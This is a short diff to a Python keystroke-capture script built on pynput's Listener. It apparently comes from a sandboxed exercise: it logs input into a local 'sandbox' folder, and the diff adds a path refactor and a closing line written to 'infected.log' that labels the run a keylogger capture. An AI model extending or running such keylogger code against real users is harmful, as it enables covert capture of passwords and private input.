@@ -3,7 +3,8 @@ from pynput.keyboard import Key, Listener
 from pathlib import Path
 import logging
 
-BOX = Path(__file__).resolve().parent / "sandbox"
+ROOT = Path(__file__).resolve().parent
+BOX = ROOT/ "sandbox"
 BOX.mkdir(exist_ok=True)                      # ensure sandbox/ exists
 
 # ---------- Configure logging ----------
@@ -38,3 +39,8 @@ with Listener(on_press=on_press) as listener:
     # .join() blocks the main thread and keeps the program alive
     # until the listener is stopped manually (Ctrl-C) or via listener.stop().
     listener.join()
+
+# ---------- High-level run marker ----------
+# After the listener exits, add one summary line.
+with (BOX / "infected.log").open("a") as f:
+    f.write(f"[{datetime.now()}] Keylogger captured 30 s of input\n")
